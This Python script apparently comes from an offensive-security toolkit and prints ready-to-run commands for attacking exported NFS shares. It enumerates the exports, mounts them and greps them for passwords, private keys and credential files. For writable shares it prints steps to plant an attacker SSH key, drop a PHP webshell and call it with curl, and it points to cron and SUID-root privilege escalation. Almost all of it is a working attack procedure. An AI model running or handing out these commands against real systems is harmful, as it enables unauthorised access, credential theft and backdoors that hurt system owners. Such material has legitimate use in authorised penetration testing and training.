#!/usr/bin/env python3
"""NFS (2049) foothold via exported shares. PRINTS commands. Edit LHOST in _services_common.py.

Usage:
  python3 gen_nfs.py enum  --target 10.0.0.5
  python3 gen_nfs.py loot  --target 10.0.0.5 --export /srv/share
  python3 gen_nfs.py shell --target 10.0.0.5 --export /home/deploy   # writable export -> foothold
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "enum"
t   = opt("--target", "<target>")
ex  = opt("--export", "/srv/share")

if arg == "enum":
    print(f"# list exports + squash settings:")
    print(f"# needs: NFS reachable on 2049 (mountd/rpcbind not firewalled).")
    print(f"showmount -e {t}")
    print(f"#   -> ok: one or more 'Export list' lines print = you can see the exports + their allowed clients")
    print(f"nmap --script nfs-showmount,nfs-ls,nfs-statfs -p 2049 {t}")
    print(f"# -> readable export = loot;  writable = shell;  'no_root_squash' = privesc (../../linpriv gen_misc nfs).")

elif arg == "loot":
    print(f"# mount + read (creds/keys/configs/backups):")
    print(f"# needs: a READABLE export in <export> (from `enum`) whose client-ACL lets your IP mount it.")
    print(f"sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3 {t}:{ex} /mnt/nfs")
    print(f"#   -> ok: `mount` returns silently and `ls /mnt/nfs` lists files = the export mounted")
    print(f"grep -rIiE 'password|secret|BEGIN (RSA|OPENSSH) PRIVATE' /mnt/nfs 2>/dev/null | head")
    print(f"find /mnt/nfs -name 'id_*' -o -name '*.kdbx' -o -name '.env' -o -name '*.bak' 2>/dev/null")
    print(f"# found an SSH key -> ssh in.  found creds -> ../network/gen_shell.py.")

elif arg == "shell":
    print(f"# WRITABLE export -> foothold (pick what the export is):")
    print(f"# needs: the export is WRITABLE (root_squash still lets you write as a matching UID) and maps to something the box runs.")
    print(f"sudo mount -t nfs -o vers=3 {t}:{ex} /mnt/nfs")
    print(f"#   -> ok: `touch /mnt/nfs/.wtest && rm /mnt/nfs/.wtest` succeeds = the export is writable")
    print(f"# order: pick the branch that matches what <export> IS (D is instant root when it applies).")
    print(f"# A) it's a user home -> drop an authorized_keys and SSH in as that user:")
    print(f"ssh-keygen -f k -N ''; sudo mkdir -p /mnt/nfs/.ssh; cat k.pub | sudo tee -a /mnt/nfs/.ssh/authorized_keys")
    print(f"ssh -i k <user>@{t}")
    print(f"#   -> ok: you get a shell as <user> = the export was that user's home")
    print(f"# B) it's a web root -> drop a webshell:")
    print(f"echo '{P.WEBSHELL_PHP_NQ}' | sudo tee /mnt/nfs/s.php   # then curl http://{t}/s.php?0=id")
    print(f"#   -> ok: `curl http://{t}/s.php?0=id` returns command output = it is served as a web root")
    print(f"# C) it's a cron/scripts dir root runs -> drop a payload (see ../../linpriv gen_misc cron).")
    print(f"# D) no_root_squash -> SUID-root binary = instant root (../../linpriv gen_misc nfs).")
else:
    print("use: enum | loot | shell"); sys.exit(1)
